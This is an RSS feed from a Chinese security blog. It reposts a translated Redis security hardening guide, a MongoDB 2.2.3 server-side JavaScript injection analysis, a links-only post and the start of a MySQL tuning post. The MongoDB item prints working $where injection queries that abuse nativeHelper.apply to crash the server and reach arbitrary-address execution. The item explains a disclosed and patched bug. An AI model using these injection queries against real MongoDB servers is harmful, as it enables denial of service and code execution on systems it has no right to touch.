﻿<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
<channel>
<title><![CDATA[迷茫者]]></title> 
<description><![CDATA[迷茫者王者归来。]]></description>
<link>http://onelose.com/</link>
<language>zh-cn</language>
<generator>www.emlog.net</generator>
<item>
	<title>Redis数据库安全手册</title>
	<link>http://onelose.com/post-204.html</link>
	<description><![CDATA[
 <div> 
 <h2 style='background-color:rgb(255, 255, 255);color:rgb(51, 51, 51);font-family:微软雅黑;font-size:30px;font-style:normal;font-weight:bold;text-align:start;'></h2> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:center;'><img data-original='http://image.3001.net/images/20150312/1426129014236.jpg!small' title='redis.jpg' src='http://note.youdao.com/yws/res/2881/445CCB436FF748298CD9ACEABA2CA42E' data-media-type='image'></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 176, 80);'><strong style='font-weight:700;'>Redis是一个高性能的key-value数据库，这两年可谓火的不行。而Redis的流行也带来一系列安全问题，不少攻击者都通过Redis发起攻击。本文将讲解这方面的内容，包括Redis提供的访问控制和代码安全问题，以及可以由恶意输入和其他类似的手段触发的攻击。</strong></span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'><span style='font-size:18px;'>Redis通用安全模块</span></strong></span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>Redis被设计成只能由可信环境的可信机器访问。这意味着将它直接暴露在互联网或者其他可以由不可信机器通过TCP或者UNIX SCOKET直接连接的环境中。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>例如，在通常的WEB应用程序使用Redis作为数据库，cache,或者消息系统。WEB应用程序的客户端将查询Redis生成页面或执行请求或由用户触发。在这个例子中，WEB应用链接了Redis和不可信的客户端。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>这是一个特定的例子，但是一般来说，不授信的Redis链接应该被监控，验证用户输入，再决定执行什么样的操作。因为，Redis追求的不是最大的安全性，而是简洁与高效。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);font-size:18px;'><strong style='font-weight:700;'>网络安全</strong></span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>Redis链接应该对每个受信的客户端开放。所以，服务器运行的Redis应该只被使用Redis应用的计算机连接。在大多数直接暴露在互联网的单个计算机，例如，虚拟化的LINUX实例（LINODE，EC2，…..）</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>Redis端口应该被防火墙阻止来自外部的访问。客户端应该仍然能通过服务器的本地回环接口访问Redis。<span style='color:rgb(0, 176, 80);'>注意，通过在Redis.CONF添加下面一句就可以绑定本地回环，阻止外网访问了。</span></p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>bind&nbsp;127.0.0.1</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'>因为Redis的特性，没有对外网访问进行限制会是一个很重大的安全问题。例如一条简单的FLUSHALL命令就能被攻击者用来删除整个数据设置。</strong></span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'><span style='font-size:18px;'>身份验证机制</span></strong></span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>如果你们不想使用访问限制的话，Redis提供了一个身份验证功能，可以通过编辑Redis.CONF文件来实现它。<br></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>如果开启了身份验证功能，Redis将拒绝所有的未身份验证的客户端的所有操作。客户端可以发送AUTH命令+密码来验证自己。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>密码是由系统管理员在Redis。CONFIG文件中设置的明文密码，为了防止暴力破解攻击他应该足够长。原因有两个：</p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>Redis的执行效率非常快，外部设备每秒可以测试相当数量的密码
Redis的密码是存储在Redis.conf文件和内部客户端的配置中的，因此不需要管理员记住。所以可以使用相当长的密码。</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>身份验证的目标是提供第二层的安全保障。这样当防火墙或者其他第一层的系统安全设置失效的话，一个外部设备在没有密码的情况下仍然不能访问redia。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>AUTH命令像其他的redia命令一样是不加密传输的，所以他不能阻止攻击者在内网的窃听。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'><span style='font-size:18px;'>数据加密支持</span></strong></span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>Redis不支持加密。为了受信的客户端可以以加密形式通过互联网可以采用加密协议（SSL）传输数据。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'><span style='font-size:18px;'>禁用特定的命令</span></strong></span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>禁用Redis的一些命令是可行的，或者将他们改名。这样来自客户端的请求就只能执行有限的命令。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>例如，虚拟的服务器提供商可能提供托管的Redis服务。在这种情况下，普通用户不应该能够调用Redis的配置命令来修改该配置实例，但提供和删除服务的系统能够有这样的权限。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><strong style='font-weight:700;'>在这种情况下，从命令表中重命名命令或者完全隐藏命令是可能的。这个功能可用在Redis.conf配置文件里做为一个声明。例如：</strong></p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>rename-command&nbsp;CONFIG&nbsp;b840fc02d524045429941cc15f59e41cb7be6c52</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><strong style='font-weight:700;'>在上面的例子里，CONFIG命令被更名为一个更为陌生的名字。它也完全可以被重命名成空字符串，例如：</strong></p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>rename-command&nbsp;CONFIG&nbsp;''</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'><span style='font-size:18px;'>由精密的输入触发的攻击</span></strong></span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>还有一类攻击，攻击者即使没有获得数据库的访问权限也可以从外部发起攻击。一个此类攻击的例子是通过Redis的内部函数向Redis里插入数据。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>攻击者可以通过一个web表单将一组字符串提交到一个hash的同一个堆栈，引起时间复杂度从O（1）到O(n) ,消耗更多的CPU资源，最终导致DOS攻击。为了防止这种特定的攻击方式，Redis为每个执行请求随机分配hash。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>Redis使用快速排序算法来执行SORT命令。目前，这个算法不是随机的，所以通过对输入的精细控制可能触发命令的二次执行。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'><span style='font-size:18px;'>字符串转义和NOSQL注入</span></strong></span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>Redis协议里面没有字符串转义相关的内容，所以在通常情况下是不存在注入的。Redis协议使用的是前缀长度的字符串，完全二进制，保证安全性。LUA脚本执行EVAL和EVALSHA命令时遵循相同的规则，因此这些命令也是安全的。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>然而这回事一个非常奇怪的用例，应用程序应该避免使用LUA脚本获取来自非信任源的字符串。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'><span style='font-size:18px;'>代码安全性</span></strong></span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>在经典的Redis 设置里，客户端可以执行所有的命令集，但是获得的用例应该永远不能导致有控制Redis所在系统的能力。内在的，Redis使用众所周知的安全代码规范来防止缓冲区溢出，格式错误和其它内存损坏问题。然而，客户端拥有控制使用服务器配置命令CONFIG的能力使得其能够改变程序的工作目录和转储文件的名称。这允许客户端写RDB Redis在随机路径写文件。这是一个安全问题，容易导致客户端有Redis运行非法代码的能力。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>Redis不需要root权限运行，也不建议以root权限运行。Redis的作者正在调查添加一条新的配置参数来防止CONFIG SET/GET 目录和其他类似的运行时配置的指令的可能性。这会阻止客户端强制服务器在任意位置写Redis转储文件。</p> 
 <h2 style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:30px;font-style:normal;font-weight:500;text-align:start;'><span style='color:rgb(0, 0, 0);'>GPG key</span></h2> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>安全研究人员可以在Github提交问题，当你感觉这个安全问题真的很重要，在文档的末尾加上GPG标识。</p> 
 <pre style='background-color:rgb(245, 245, 245);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>-----BEGIN&nbsp;PGP&nbsp;PUBLIC&nbsp;KEY&nbsp;BLOCK-----
Version:&nbsp;GnuPG&nbsp;v1.4.13&nbsp;(Darwin)

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
vI1sAEeV6ZM/uc4CDI3E2TxEbQ==</pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'>Key fingerprint</strong></span></p> 
 <pre style='background-color:rgb(245, 245, 245);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>pub&nbsp;&nbsp;&nbsp;4096R/0E5C88D6&nbsp;2013-11-07&nbsp;[expires:&nbsp;2063-10-26]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Key&nbsp;fingerprint&nbsp;=&nbsp;E5F3&nbsp;DA80&nbsp;35F0&nbsp;2EC1&nbsp;47F9&nbsp;&nbsp;020F&nbsp;3181&nbsp;3728&nbsp;0E5C&nbsp;88D6
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Salvatore&nbsp;Sanfilippo&nbsp;&lt;antirez@gmail.com&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;&nbsp;&nbsp;4096R/3B34D15F&nbsp;2013-11-07&nbsp;[expires:&nbsp;2063-10-26]</pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'>[</strong></span><a href='http://redis.io/topics/security#code-security' target='_blank' style='background-color:0px 0px;color:rgb(6, 154, 239);'><strong style='font-weight:700;'>原文地址</strong></a><span style='color:rgb(0, 0, 0);'><strong style='font-weight:700;'>，ubuntu翻译及编辑，转载须注明来自FreeBuf黑客与极客（FreeBuf.COM）]</strong></span></p> 
 <br> 
</div>
 ]]></description>
	<pubDate>Sun, 12 Apr 2015 22:00:00 +0000</pubDate>
	<author>迷茫者</author>
	<guid>http://onelose.com/post-204.html</guid>

</item>
<item>
	<title>MongoDB服务器端的JavaScript注入</title>
	<link>http://onelose.com/post-200.html</link>
	<description><![CDATA[
 <div> 
 <h2 style='background-color:rgb(255, 255, 255);color:rgb(51, 51, 51);font-family:微软雅黑;font-size:30px;font-style:normal;font-weight:bold;text-align:start;'></h2> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><strong style='font-weight:700;'><span style='color:rgb(0, 153, 0);'>安全研究者agixid在MongoDB数据库2.2.3版本上发现一个安全漏洞，并且表示Metasploit利用payload正在开发当中。该漏洞主要是MongoDB不正确的使用SpiderMonkey&nbsp; Javascript的NativeHelper函数，导致可以注入代码或缓冲区溢出执行任意代码。</span></strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'><strong style='font-weight:700;'>以下为研究者带来的一些分析。</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>首先在MongoDB中尝试一些服务器端的JavaScript注入，尝试运行一个shell。</p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; run('uname','-a')
Sun Mar 25 07:09:49 shell: started program
sh1838| Linux mongo 2.6.32-5-686 #1 SMP Sun Sep 23 09:49:36 UTC 2012 i686 GNU/Linux
0</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>以下这个命令只能在mongo客户端才有效</p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; db.my_collection.find({$where:'run('ls')'})
error: {
 '$err' : 'error on invocation of $where function:\nJS Error: ReferenceError: run is not defined nofile_a:0',
 'code' : 10071
}</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>研究者继续深入尝试</p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; run
function () {
    return nativeHelper.apply(run_, arguments);
}</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>运行&lt;run&gt;函数，在服务端直接调用 nativeHelper.apply(run_,['uname','-a']); ，返回信息提示nativeHelper.apply方法存在。</p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; db.my_collection.find({$where:'nativeHelper.apply(run_, ['uname','-a']);'})
error: {
	'$err' : 'error on invocation of $where function:\nJS Error: ReferenceError: run_ is not defined nofile_a:0',
	'code' : 10071
}</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>将一个关联数组用到服务器端</p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; db.my_collection.find({$where:'nativeHelper.apply({'x':135246144}, ['uname','-a']);'})
Sun Mar 25 07:15:26 DBClientCursor::init call() failed
Sun Mar 25 07:15:26 query failed : sthack.my_collection { $where: 'nativeHelper.apply({'x':135246144}, ['uname','-a']);' } to: 127.0.0.1:27017
Error: error doing query: failed
Sun Mar 25 07:15:26 trying reconnect to 127.0.0.1:27017
Sun Mar 25 07:15:26 reconnect 127.0.0.1:27017 failed couldn't connect to server 127.0.0.1:27017</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>结果显示：The server crashed \o/ ! （崩溃）</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>查看看一下其源代码</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>路径：./src/mongo/scripting/engine_spidermonkey.cpp</p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>JSBool native_helper( JSContext *cx , JSObject *obj , uintN argc, jsval *argv , jsval *rval ) {
        try {
            Convertor c(cx);
            NativeFunction func = reinterpret_cast(
                    static_cast( c.getNumber( obj , 'x' ) ) );
            void* data = reinterpret_cast</span><span>&lt;void</span><span style='color:rgb(72, 72, 76);'>*</span><span>&gt;</span><span style='color:rgb(72, 72, 76);'>(
                    static_cast( c.getNumber( obj , 'y' ) ) );
            verify( func );

            BSONObj a;
            if ( argc &gt; 0 ) {
                BSONObjBuilder args;
                for ( uintN i = 0; i &lt; argc; ++i ) {
                    c.append( args , args.numStr( i ) , argv[i] );
                }
                a = args.obj();
            }

            BSONObj out;
            try {
                out = func( a, data );
            }
            catch ( std::exception&amp; e ) {</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>原函数的功能会从”x” : 135246144调用至JavaScript对象不带任何检查。</p> 
 <pre style='background-color:rgb(247, 247, 249);color:rgb(51, 51, 51);font-family:Menlo, Monaco, Consolas, 'Courier New', monospace;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(72, 72, 76);'>&gt; db.my_collection.find({$where:'nativeHelper.apply({'x':0x31337}, ['uname','-a']);'})

Sun Mar 25 07:20:03 Invalid access at address: 0x31337 from thread: conn1
Sun Mar 25 07:20:03 Got signal: 11 (Segmentation fault).</span></pre> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(88, 88, 88);font-family:微软雅黑;font-size:14px;font-style:normal;font-weight:normal;text-align:start;'>MongoDB已发布最新版本2.4.1修复了该漏洞，<a href='http://www.mongodb.org/downloads' target='_blank' style='background-color:0px 0px;color:rgb(6, 154, 239);'>下载地址</a></p> 
 <br> 
</div>
 ]]></description>
	<pubDate>Sun, 12 Apr 2015 22:00:00 +0000</pubDate>
	<author>迷茫者</author>
	<guid>http://onelose.com/post-200.html</guid>

</item>
<item>
	<title>http://www.freebuf.com/author/unshell</title>
	<link>http://onelose.com/post-202.html</link>
	<description><![CDATA[
 <div> 
 <a href='http://www.freebuf.com/author/unshell'>http://www.freebuf.com/author/unshell</a> 
</div> 
<div> 
 <br> 
</div> 
<div> 
 <a href='http://sqlmap.org/'>http://sqlmap.org/</a> 
</div>
 ]]></description>
	<pubDate>Thu, 09 Apr 2015 22:00:00 +0000</pubDate>
	<author>迷茫者</author>
	<guid>http://onelose.com/post-202.html</guid>

</item>
<item>
	<title>mysql性能优化方向</title>
	<link>http://onelose.com/post-211.html</link>
	<description><![CDATA[
 <div> 
 <h1 style='background-color:rgb(255, 255, 255);color:rgb(102, 102, 102);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:14.7px;font-style:normal;font-weight:bold;text-align:left;'><a href='http://www.cnblogs.com/AloneSword/p/3207697.html' style='color:rgb(52, 104, 164);'></a></h1> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>按照从大到小，从主要到次要的形式，分析 mysql 性能优化点，达到最终优化的效果。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>利用 mindmanger 整理了思路，形成如下图，每个点在网上都能找到说明，并记录下。形成了优化的思路：</p> 
